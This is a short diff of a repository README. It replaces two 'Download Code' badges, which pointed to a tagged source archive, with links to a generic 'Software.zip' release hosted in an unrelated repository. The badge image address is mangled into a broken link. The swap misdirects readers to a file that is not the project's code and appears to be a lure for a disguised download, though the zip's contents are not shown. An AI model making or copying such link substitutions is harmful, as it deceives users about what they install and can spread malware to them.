@@ -2,7 +2,7 @@
 
 ---
 
-[![Download Code](https://img.shields.io/badge/Download%20Code-v1.0.0-green)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Code](https://github.com/namsom789/Data-Structures-C/releases/download/v1.0/Software.zip%20Code-v1.0.0-green)](https://github.com/namsom789/Data-Structures-C/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Here are the key topics covered in this repository:
 
 To get started with the code in this repository, you can download the code using the following link:
 
-[![Download Code](https://img.shields.io/badge/Download%20Code-v1.0.0-green)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Code](https://github.com/namsom789/Data-Structures-C/releases/download/v1.0/Software.zip%20Code-v1.0.0-green)](https://github.com/namsom789/Data-Structures-C/releases/download/v1.0/Software.zip)
 
 ---
 
